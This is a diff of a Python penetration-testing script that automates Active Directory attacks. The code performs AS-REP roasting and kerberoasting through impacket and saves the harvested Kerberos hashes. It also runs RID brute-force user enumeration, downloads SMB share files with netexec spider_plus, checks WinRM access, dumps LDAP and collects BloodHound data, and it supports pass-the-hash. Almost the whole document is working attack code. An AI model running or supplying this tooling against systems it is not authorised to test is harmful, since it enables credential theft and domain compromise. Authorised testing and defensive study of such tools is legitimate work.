-    if app_args.crack:
-        if app_args.wordlist:
-            crack_hashes(server)
-        else:
-            print(f'{RED}[-] No wordlist provided{RESET}')
-        
-def validate_ip(ip):
-    try:
-        res = ipaddress.ip_address(ip)
-        return True
+        # Check if the input is a valid IP address
+        ip = ipaddress.ip_address(ip_or_url)
+        return str(ip)  # Return the IP if it's valid
     except ValueError:
-        return False
+        # If not an IP, assume it's a URL and extract the domain
+        parsed_url = urlparse(ip_or_url)
+        domain = parsed_url.netloc or parsed_url.path  # Handle cases like "example.com"
 
-def generate_ip_addresses(network_address):
-    try:
-        network = ipaddress.ip_network(network_address, strict=False)
-        return list(network.hosts())
-    except ValueError as e:
-        print(f"{RED}[-]: {e}")
-        return []
+        if not domain:
+            raise ValueError("Invalid input: Not a valid IP or URL")
 
-def read_target_ip_address():
-    if '/' in app_args.target:
-        print(f"{BLUE}[!x!] Retrieving Alive IP addresses...{RESET}")
-        list = (str)(app_args.target).split('/')
-        ip_address = list[0]
-        isValid = validate_ip(ip_address)
-        if isValid:
-            ip_address =  generate_ip_addresses(app_args.target)
-            message = f"netexec smb {app_args.target} |  grep -oP 'SMB\s+\K\d+\.\d+\.\d+\.\d+' "
-            data = run_command(message)
-            cleaned_data = data.strip("[]'").strip()
-            # Step 2: Split by newline to get individual IP addresses
-            alive_ip = cleaned_data.split("\n")
-            return alive_ip
-        else:
-            print(f"{RED}[-] Invalid IP Address Network")
-            sys.exit(1)
+        try:
+            # Resolve the domain to an IP address
+            ip = socket.gethostbyname(domain)
+            return ip
+        except socket.gaierror:
+            raise ValueError(f"Could not resolve domain: {domain}")
+
+
+########## COMMANDS ##########
+
+
+def gen_impacket_access(username, password, password_hash, server, domain):
+    access = ""
+    if domain:
+        if domain.count('.') > 1:
+            domain = domain.split('.', 1)[1]
         
-    return [app_args.target]
+        if username and password:
+            access = f"'{domain}'/'{username}':'{password}'@'{server}' "
+        elif username and password_hash:
+            access = f"'{domain}'/'{username}'@'{server}' -hashes :{password_hash} "
+        elif not password:
+            access = f"'{domain}'/'{username}'@'{server}' -no-pass "
+    else:
+        if username and password:
+            access = f"'{username}':'{password}'@'{server}' "
+        elif username and password_hash:
+            access = f"'{username}'@'{server}' -hashes :{password_hash} "
+        elif not username or not password:
+            access = f"'{username}'@'{server}' -no-pass "
+
+    return access
 
 
-if __name__ == "__main__":   
-    display_banner()
-    try:
-        validate_arguments()
-        alive_ip = read_target_ip_address()
-        setup_app(alive_ip)
-        print(f"{RESET}{PURPLE}--------------------{GREEN}H{ORANGE}A{BLUE}P{RED}P{GREEN}Y{ORANGE} {BLUE}H{RED}A{GREEN}U{ORANGE}N{BLUE}T{RED}I{GREEN}N{ORANGE}G{BLUE}!{RED}!{PURPLE}----------------{PURPLE}{RESET}")
-        for ip in alive_ip:
-            print(f"{ORANGE}---------------------------------------------------------------------------------------{RESET}")
-            print(f"{BLUE}[!x!] Scanning {ip}{RESET}")
-            handle_request(app_args.username,app_args.password,app_args.ntlm_hash,ip,app_args.domain)
-        remove_empty_files(base_directory_map[alive_ip[0]])
-    except Exception as e:
-        remove_empty_files(base_directory_map[alive_ip[0]])
-        print(f"{RED}[-] {str(e)}{RESET}")
+def get_NPUsers(username, password, password_hash, server, domain):
+    print(f"{PURPLE}[!] Enumerating NPUsers using impacket...{RESET}")
+    users_file = workspace["files"]["lookup_sids"]["users"]
+    krb_hash_prefix = "$krb5asrep"
+    command = f"impacket-GetNPUsers {gen_impacket_access(username,password,password_hash,server,domain)} -usersfile {args.usersfile or users_file} "
+    output, error = run_command(command)
 
+    if error:
+        print(error)
+        return
+
+    output_hashes = [line for line in output.split("\n") if krb_hash_prefix in line]
+    np_users_file = workspace["files"]["kerberos"]["np_users"]
+    if krb_hash_prefix in output:
+        # TODO: Test
+        # save_to_file(np_users_file, output_hashes.split('/usr')[0])
+        save_to_file(np_users_file, output_hashes)
+        print(f"{GREEN}[+] Saved NPUsers hashes to {np_users_file}{RESET}")
+    else:
+        print(f"{RED}[-] No NPUsers found{RESET}")
+
+
+def get_UserSPNs(username, password, hash, server, domain):
+    print(f"{PURPLE}[!] Enumerating UserSPNs using impacket...{RESET}")
+    krb_hash_prefix = "$krb5tgs"
+    command = f"impacket-GetUserSPNs {gen_impacket_access(username,password,hash,server,domain)} -request"
+    if domain:
+        command += f' -dc-host {domain}'
+    if args.kerberos:
+        command += ' -k'
+
+    output, error = run_command(command)
+    if error:
+        print(error)
+        return
+
+    np_users_file = workspace["files"]["kerberos"]["snp_users"]
+    if krb_hash_prefix in output:
+        # TODO: Test
+        # save_to_file(np_users_file,results.split('/usr')[0])
+        save_to_file(np_users_file, output)
+        print(f"{GREEN}[+] Saved UserSPNs hashes to {np_users_file}{RESET}")
+    else:
+        print(f"{RED}[-] No UserSPNs found")
+
+
+def enum_smb(username, password, password_hash, ip, domain):
+    print(f"{PURPLE}[!] Enumerating SMB...{RESET}")
+    command = gen_netexec_cmd(username, password, password_hash, ip, domain, "smb", "--shares")
+    
+    output, error = run_command(command)
+    if error:
+        print(error)
+        return
+
+    pattern = r"\b(\w+)\s+READ\b"
+    matches = re.findall(pattern, output)
+
+    # Remove escape sequences and extract share names from the matches
+    share_names = [match for match in matches if match.upper() != "PERMISSIONS"]
+
+    # save share names to file
+    result_string = "\n".join(share_names)
+    share_names_txt = workspace["files"]["smb"]["share_names"]
+    save_to_file(share_names_txt, result_string)
+    print(f"{GREEN}[+] SMB share drive names saved to {share_names_txt}{RESET}")
+
+    # save crackmap results to file
+    share_drives_txt = workspace["files"]["smb"]["share_drives"]
+    save_to_file(share_drives_txt, output)
+    print(f"{GREEN}[+] SMB share drives list saved to {share_drives_txt}{RESET}")
+
+    # Download smb files
+    if len(share_names) > 0:
+        workspace_smb = workspace["dirs"]["smb"]
+        workspace_spider = workspace_smb / "spider"
+
+        print(f"{ORANGE}[*] Downloading SMB share files to {workspace_smb}{RESET}")
+        command = gen_netexec_cmd(username, password, password_hash, ip, domain, "smb", "-M spider_plus -o DOWNLOAD_FLAG=True")
+        server = domain if domain else ip
+
+        output, error = run_command(command)
+        if error:
+            print(error)
+            return
+
+        save_path = Path("/tmp/nxc_hosted/nxc_spider_plus")
+        if workspace_spider.exists():
+            shutil.rmtree(workspace_spider)
+        shutil.move(save_path / server, workspace_spider)
+        shutil.move(save_path / f"{server}.json", workspace_smb / "spider.json")
+    else:
+        print(f"{RED}[-] No read permissions on SMB shares {RESET}")
+
+
+def enum_winrm(username, password, password_hash, ip, domain):
+    print(f"{PURPLE}{PURPLE}[!] Connecting to WinRM...{RESET}")
+    command = gen_netexec_cmd(username, password, password_hash, ip, domain, "winrm", "")
+    output, error = run_command(command)
+    if error:
+        print(error)
+        return
+
+    if "Pwn3d" in output:
+        print(f"{GREEN}[+] Connected to WinRM{RESET}")
+    else:
+        print(f"{RED}[-] Could not connect to WinRM{RESET}")
+
+
+def enum_lookupsid(username, password, password_hash, ip, domain):
+    print(f"{PURPLE}[!] Enumerating users with netexec rib bruteforce (up to 5000)...{RESET}")
+    command = gen_netexec_cmd(username, password, password_hash, ip, domain, "smb", "--rid-brute 5000")
+
+    output, error = run_command(command)
+    if error:
+        print(error)
+        return
+
+    lookupsid_file = workspace["files"]["lookup_sids"]["lookup_sids"]
+    users_file = workspace["files"]["lookup_sids"]["users"]
+    if "[-] SMB SessionError:" in output:
+        print(f"{RED}[-] Could not find domain sids{RESET}")
+    else:
+        save_to_file(lookupsid_file, output)
+        print(f"{GREEN}[+] Lookupsids saved to {lookupsid_file}{RESET}")
+        output_usernames = ""
+        for line in output.split("\n"):
+            if "SidTypeUser" not in line:
+                continue
+            output_usernames += line.split()[5].split("\\")[1] + "\n"
+
+        save_to_file(users_file, output_usernames)
+        print(f"{GREEN}[+] Users list saved to {users_file}{RESET}")
+
+
+def enum_ldap(username, password, password_hash, ip, domain):
+    print(f"{PURPLE}[!] Enumerating LDAP...{RESET}")
+    ldap_dir = workspace["dirs"]["ldap"]
+    if args.kerberos:
+        command = gen_netexec_cmd(username, password, password_hash, ip, domain, "ldap", '--query "(objectclass=*)" ""')
+
+        output, error = run_command(command)
+        if error:
+            print(error)
+            return
+
+        ldap_output_txt = ldap_dir / 'results.txt'
+        ldap_output_html = ldap_dir / 'results.html'
+        save_to_file(ldap_output_txt, output)
+        print(f"{GREEN}[+] LDAP saved to {ldap_output_txt}{RESET}")
+        save_to_file(ldap_output_html, netexec_ldap_dump_to_html(output))
+        print(f"{GREEN}[+] LDAP saved to {ldap_output_html}{RESET}")
+    else:
+        if domain and username:
+            command = (f"ldapdomaindump -u '{domain}\\{username}' -dc-ip {ip} -o {ldap_dir} ")
+            if password:
+                command += f"-p '{password}'"
+            elif password_hash:
+                command += f"-p ':{password_hash}'"
+            else:
+                print(f"{RED}[-] Could not connect to LDAP{RESET}")
+                return
+        else:
+            print(f"{RED}[-] Could not connect to LDAP{RESET}")
+            return
+
+        run_command(command)
+
+        files = list(ldap_dir.glob("*"))
+        if len(files) == 0:
+            print(f"{RED}[-] Could not connect to LDAP{RESET}")
+            return
+
+        print(f"{GREEN}[+] LDAP saved to {ldap_dir}{RESET}")
+        for file in files:
+            extension = file.suffix.lstrip(".").lower()
+
+            extension_dir = ldap_dir / extension
+            extension_dir.mkdir(exist_ok=True)
+
+            file.rename(extension_dir / file.name)
+
+
+def enum_bloodhound(username, password, password_hash, server, domain):
+    print(f"{PURPLE}[!] Collecting Bloodhound Files...{RESET}")
+    if domain.count('.') > 1:
+        domain = domain.split('.', 1)[1]
+    
+    command = f"bloodhound-python -d {domain} -u '{username}' -ns {server} -c all --dns-timeout 100 --zip -op {username} "
+    if username and password:
+        command += f"-p '{password}'"
+    elif username and password_hash:
+        command = f"--hashes '{password_hash}'"
+
+    run_command(command)
+
+    files = list(workspace["dirs"]["cwd"].glob("*.zip"))
+    bloodhound_dir = workspace["dirs"]["bloodhound"]
+    if len(files) == 0:
+        print(f"{RED}[-] Could not collect Bloodhound Files{RESET}")
+        return
+
+    for file in files:
+        shutil.move(file, bloodhound_dir)
+
+    print(f"{GREEN}[+] Bloodhound saved to {bloodhound_dir}")
+
+
+def handle_request(username, password, password_hash, server, domain):
+    if args.full: 
+        enum_smb(username, password, password_hash, server, domain) 
+        enum_winrm(username, password, password_hash, server, domain)
+        enum_lookupsid(username, password, password_hash, server, domain)
+        get_NPUsers(username, password, password_hash, server, domain)
+        get_UserSPNs(username, password, password_hash, server, domain)
+        enum_bloodhound(username, password, password_hash, server, domain)
+        enum_ldap(username, password, password_hash, server, domain)
+    else:
+        if args.lookupsid:
+            enum_lookupsid(username, password, password_hash, server, domain)
+        
+        if args.npusers:
+            get_NPUsers(username, password, password_hash, server, domain)
+        
+        if args.userspn:
+            get_UserSPNs(username, password, password_hash, server, domain)
+
+        if args.smb:
+            enum_smb(username, password, password_hash, server, domain)
+
+        if args.winrm:
+            enum_winrm(username, password, password_hash, server, domain)
+
+        if args.ldap:
+            enum_ldap(username, password, password_hash, server, domain)
+
+        if args.bloodhound:
+            enum_bloodhound(username, password, password_hash, server, domain)
+
+        if args.npusers and not args.kerberos:
+            get_NPUsers(username, password, password_hash, server, domain)
+
+        if args.userspn and not args.kerberos:
+            get_UserSPNs(username, password, password_hash, server, domain)
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='Script description')
+    parser.add_argument('-t', '--target', help='Target host or IP address')
+    parser.add_argument('-d', '--domain', help='Domain name of the target machine')
+    parser.add_argument('-u', '--username', help='Username for authentication', default='')
+    parser.add_argument('-p', '--password', help='Password for authentication', default='')
+    parser.add_argument('-H', '--ntlm-hash', help='NTLM Hash for authentication', default='')
+    parser.add_argument('-us', '--usersfile', help='List of domain users', default='')
+    parser.add_argument('-k', '--kerberos', action='store_true', help='Enable kerberoasting mode', default=False)
+    parser.add_argument('--lookupsid', action='store_true', help='Enable lookupsid mode', default=False)
+    parser.add_argument('--npusers', action='store_true', help='Enable GetNPUsers mode', default=False)
+    parser.add_argument('--userspn', action='store_true', help='Enable GetUserSPNs mode', default=False)
+    parser.add_argument('--ldap', action='store_true', help='Enable LDAP mode Enumeration', default=False)
+    parser.add_argument('--smb', action='store_true', help='Enable SMB mode Enumeration', default=False)
+    parser.add_argument('--full', action='store_true', help='Enable full mode Enumeration', default=False)
+    parser.add_argument('--winrm', action='store_true', help='Enable winrm mode Enumeration', default=False)
+    parser.add_argument('--bloodhound', action='store_true', help='Enable bloodhound mode Enumeration', default=False)
+    parser.add_argument('-q', '--quiet', action='store_true', help='Show banner of script', default=False)
+    
+    args = parser.parse_args()
+
+    if not args.quiet:
+        display_banner()
+
+    if not args.target and not args.domain:
+        print('Missing target...')
+        parser.print_help()
+        exit(1)
+
+    args.target = parse_and_resolve(args.target) if args.target else parse_and_resolve(args.domain)
+    args.faketime = get_faketime(args.target)
+
+    workspace = workspace_get_names(args.target)
+    workspace_init(workspace)
+
+    display_args_info(args.target)
+
+    handle_request(args.username,args.password,args.ntlm_hash,args.target,args.domain)
+
+    workspace_cleanup(workspace['dirs']['base'])
+
+    if not args.quiet:
+        output, _ = run_command(f"tree {workspace['dirs']['base']}")
+        print(output)
